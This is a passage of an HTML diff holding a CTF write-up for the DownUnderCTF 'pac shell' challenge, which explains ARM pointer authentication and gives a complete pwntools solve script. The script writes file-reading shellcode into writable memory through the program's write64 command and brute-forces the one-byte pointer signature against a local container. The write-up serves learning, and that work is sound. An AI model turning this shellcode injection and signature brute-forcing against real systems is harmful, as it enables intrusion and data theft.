+Some details can be found here: <a href="http://hehezhou.cn/isa/autia.html">http://hehezhou.cn/isa/autia.html</a> , <a href="http://hehezhou.cn/isa/pacia.html">http://hehezhou.cn/isa/pacia.html</a> . Also ChatGPT did a good job explaining.
+In a nutshell, this instructions use top bits of a pointer to sign address. For example:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>Welcome<span class="w"> </span>to<span class="w"> </span>pac<span class="w"> </span>shell<span class="w"> </span>v0.0.1
+<span class="w">   </span>help:<span class="w"> </span>0x01005500000b7c
+<span class="w">     </span>ls:<span class="w"> </span>0x78005500000a54
+<span class="w"> </span>read64:<span class="w"> </span>0x29005500000a78
+write64:<span class="w"> </span>0x15005500000afc
+pacsh&gt;
+</code></pre></div></td></tr></table></div>
+<p>We can see <code>autiza</code> in action:</p>
+<ul>
+<li>Address <code>0x5500000b7c</code> was signed by <code>autiza</code> with <code>0x01</code> in top bits.</li>
+<li>Address <code>0x5500000a54</code> was signed by <code>autiza</code> with <code>0x78</code> in top bits.</li>
+<li>Address <code>0x5500000a78</code> was signed by <code>autiza</code> with <code>0x29</code> in top bits.</li>
+<li>Address <code>0x5500000afc</code> was signed by <code>autiza</code> with <code>0x15</code> in top bits.</li>
+</ul>
+<p><code>paciza</code> is an opposite operation, it converts <code>0x01005500000b7c</code> to <code>0x5500000b7c</code>.</p>
+<p>I've build container locally so I can debug:</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>ls
+Dockerfile<span class="w">  </span>ld-linux-aarch64.so.1<span class="w">  </span>libc.so.6<span class="w">  </span>pacsh<span class="w">  </span>pacsh.c<span class="w">  </span>run.sh
+$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>mytestflag<span class="w"> </span>&gt;<span class="w"> </span>flag.txt
+$<span class="w"> </span>docker<span class="w"> </span>build<span class="w"> </span>.<span class="w"> </span>--tag<span class="w"> </span>tmp_container
+<span class="c1"># -p 1337:1337 is port forwarding --privileged required by application (I guess for virtualization)</span>
+$<span class="w"> </span>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>--name<span class="w"> </span>pac_shell<span class="w"> </span>--privileged<span class="w"> </span>-p<span class="w"> </span><span class="m">1337</span>:1337<span class="w"> </span>tmp_container
+</code></pre></div></td></tr></table></div>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<p>First step of our plan is to find out address we can write to. Running application several times I can see that addresses of
+functions <code>ls</code>, <code>read64</code>, <code>write64</code> and <code>help</code> have different first byte signature, but otherwise are same: 0x..5500000b7c. This
+means that application is loaded to the same address every time.</p>
+<p>Not I got memory mapping of the process. Functions are located in the first segment, but its not writable. First writeable segment 
+I can see is on line 5. That is what we are going to use.</p>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>cat<span class="w"> </span>/proc/51526/maps
+<span class="hll"><span class="m">5500000000</span>-5500001000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634511</span><span class="w">                        </span>/chal/pacsh
+</span><span class="m">5500001000</span>-5500011000<span class="w"> </span>---p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+<span class="m">5500011000</span>-5500012000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00001000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634511</span><span class="w">                        </span>/chal/pacsh
+<span class="hll"><span class="m">5500012000</span>-5500013000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00002000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634511</span><span class="w">                        </span>/chal/pacsh
+</span><span class="m">5500013000</span>-5500020000<span class="w"> </span>---p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+<span class="m">5500020000</span>-5500021000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00010000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634511</span><span class="w">                        </span>/chal/pacsh
+<span class="m">5501021000</span>-5501022000<span class="w"> </span>---p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+<span class="m">5501022000</span>-5501822000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+<span class="m">5501822000</span>-550184c000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634475</span><span class="w">                        </span>/chal/ld-linux-aarch64.so.1
+550184c000-550185b000<span class="w"> </span>---p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+550185b000-550185d000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00029000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634475</span><span class="w">                        </span>/chal/ld-linux-aarch64.so.1
+550185d000-550185f000<span class="w"> </span>rw-p<span class="w"> </span>0002b000<span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634475</span><span class="w">                        </span>/chal/ld-linux-aarch64.so.1
+550185f000-5501860000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+<span class="m">5501860000</span>-5501862000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+<span class="m">5501870000</span>-55019f9000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634493</span><span class="w">                        </span>/chal/libc.so.6
+55019f9000-5501a08000<span class="w"> </span>---p<span class="w"> </span><span class="m">00189000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634493</span><span class="w">                        </span>/chal/libc.so.6
+5501a08000-5501a0c000<span class="w"> </span>r--p<span class="w"> </span><span class="m">00188000</span><span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634493</span><span class="w">                        </span>/chal/libc.so.6
+5501a0c000-5501a0e000<span class="w"> </span>rw-p<span class="w"> </span>0018c000<span class="w"> </span><span class="m">00</span>:45<span class="w"> </span><span class="m">1634493</span><span class="w">                        </span>/chal/libc.so.6
+5501a0e000-5501a1a000<span class="w"> </span>rw-p<span class="w"> </span><span class="m">00000000</span><span class="w"> </span><span class="m">00</span>:00<span class="w"> </span><span class="m">0</span><span class="w"> </span>
+</code></pre></div></td></tr></table></div>
+<p>Here is script that generates code and writes it to memory:</p>
+<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="c1"># function generates assembly to read flag and writes its to the base_addr</span>
+<span class="k">def</span> <span class="nf">write_shell_code</span><span class="p">(</span><span class="n">base_addr</span><span class="p">,</span> <span class="n">write64_addr</span><span class="p">):</span>
+    <span class="c1"># use pwntools shellcraft to create assembly code for reading file flag.txt and then hang thread forever</span>
+    <span class="c1"># if process immediately crashes/exists we won&#39;t get contents of the flag sent to us over network</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&quot;flag.txt&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">infloop</span><span class="p">())</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span> <span class="c1"># iterate over code 8 bytes at a time</span>
+        <span class="c1"># read next 8 bytes to send</span>
+        <span class="n">chunk_bytes</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
+        <span class="c1"># pad with 0 (only relevant for the last chunk if number of bytes in code is not mulitple of 8)</span>
+        <span class="n">chunk_bytes</span> <span class="o">+=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk_bytes</span><span class="p">))</span>
+        <span class="c1"># convert bytes to big endian and then into hex</span>
+        <span class="n">chunk_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="n">chunk_bytes</span><span class="p">))</span>
+        <span class="c1"># instruct target application that we want to execute write64</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write64_addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="c1"># wait till target application is ready to receive our input</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;write64&gt; &quot;</span><span class="p">)</span>
+        <span class="c1"># send address that we want to write too (for each chunk we increase it by i) and value of the chunk</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">((</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">chunk_hex</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="c1"># wait till application executed our write instruction</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;pacsh&gt; &quot;</span><span class="p">)</span>
+</code></pre></div></td></tr></table></div>
+<p>Now our code is ready and all is left to do is jump there. But we can't just enter base address into the application: it requires
+address to be signed. Signature is only 1 byte, so it can be quickly bruteforce it in a loop.</p>
+<details class="success">
+<summary>solve.py</summary>
+<div class="language-py highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span>
+<span class="normal">52</span>
+<span class="normal">53</span>
+<span class="normal">54</span>
+<span class="normal">55</span>
+<span class="normal">56</span>
+<span class="normal">57</span>
+<span class="normal">58</span>
+<span class="normal">59</span>
+<span class="normal">60</span>
+<span class="normal">61</span>
+<span class="normal">62</span>
+<span class="normal">63</span>
+<span class="normal">64</span>
+<span class="normal">65</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elfexe</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pacsh&#39;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">elfexe</span><span class="o">.</span><span class="n">libc</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;warn&#39;</span>
+
+<span class="c1"># function generates assembly to read flag and writes its to the base_addr</span>
+<span class="k">def</span> <span class="nf">write_shell_code</span><span class="p">(</span><span class="n">base_addr</span><span class="p">,</span> <span class="n">write64_addr</span><span class="p">):</span>
+    <span class="c1"># use pwntools shellcraft to create assembly code for reading file flag.txt and then hang thread forever</span>
+    <span class="c1"># if process immediately crashes/exists we won&#39;t get contents of the flag sent to us over network</span>
+    <span class="n">code</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">cat</span><span class="p">(</span><span class="s2">&quot;flag.txt&quot;</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">infloop</span><span class="p">())</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">code</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span> <span class="c1"># iterate over code 8 bytes at a time</span>
+        <span class="c1"># read next 8 bytes to send</span>
+        <span class="n">chunk_bytes</span> <span class="o">=</span> <span class="n">code</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
+        <span class="c1"># pad with 0 (only relevant for the last chunk if number of bytes in code is not mulitple of 8)</span>
+        <span class="n">chunk_bytes</span> <span class="o">+=</span> <span class="nb">bytearray</span><span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk_bytes</span><span class="p">))</span>
+        <span class="c1"># convert bytes to big endian and then into hex</span>
+        <span class="n">chunk_hex</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">unpack</span><span class="p">(</span><span class="n">chunk_bytes</span><span class="p">))</span>
+        <span class="c1"># instruct target application that we want to execute write64</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">write64_addr</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="c1"># wait till target application is ready to receive our input</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;write64&gt; &quot;</span><span class="p">)</span>
+        <span class="c1"># send address that we want to write too (for each chunk we increase it by i) and value of the chunk</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">((</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="n">chunk_hex</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+        <span class="c1"># wait till application executed our write instruction</span>
+        <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;pacsh&gt; &quot;</span><span class="p">)</span>
+
+
+<span class="c1"># iterate over 0..256 possible signatures</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">remote_server</span> <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span>
+    <span class="n">remote_port</span> <span class="o">=</span> <span class="mi">1337</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">remote_server</span><span class="p">,</span> <span class="n">remote_port</span><span class="p">)</span>
+
+    <span class="c1"># parse addresses of the functions from the welcome message</span>
+    <span class="c1"># Welcome to pac shell v0.0.1</span>
+    <span class="c1"># help: 0x34005500000b7c</span>
+    <span class="c1"># ls: 0x9005500000a54</span>
+    <span class="c1"># read64: 0x2a005500000a78</span>
+    <span class="c1"># write64: 0x2f005500000afc</span>
+    <span class="c1"># pacsh&gt;</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;help: 0x&quot;</span><span class="p">)</span>
+    <span class="n">help_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;read64: 0x&quot;</span><span class="p">)</span>
+    <span class="n">read64_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;write64: 0x&quot;</span><span class="p">)</span>
+    <span class="n">write64_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;pacsh&gt; &quot;</span><span class="p">)</span>
+
+    <span class="c1"># address of writable segment with 0x100 bytes offset as a precaution</span>
+    <span class="n">base_addr</span> <span class="o">=</span> <span class="mh">0x5500012100</span>
+    <span class="n">write_shell_code</span><span class="p">(</span><span class="n">base_addr</span><span class="p">,</span> <span class="n">write64_addr</span><span class="p">)</span>
+
+    <span class="c1"># append I as a top byte signature to the base address</span>
+    <span class="n">jumpAddress</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span> <span class="o">|</span> <span class="nb">int</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{:02x}</span><span class="s2">000000000000&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span>
+    <span class="c1"># send address to the application</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">jumpAddress</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+    <span class="c1"># read response its either crash info if signature is wrong or flag contents</span>
+    <span class="n">line</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
+    <span class="k">if</span> <span class="sa">b</span><span class="s2">&quot;Segmentation fault&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span> <span class="c1"># if its not crash info we got the flag - exit loop</span>
+       <span class="k">break</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></td></tr></table></div>
+</details>
 <h2 id="epilogue">Epilogue<a class="headerlink" href="#epilogue" title="Permanent link">&para;</a></h2>
 <ul>
 <li>Official website: <a href="https://downunderctf.com/">https://downunderctf.com/</a></li>
@@ -543,6 +1260,28 @@
       
         <footer class="md-footer">
   
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../jmp_flag/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Jmp flag">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Jmp flag
+              </div>
+            </div>
+          </a>
+        
+        
+      </nav>
     
   
   <div class="md-footer-meta md-typeset">
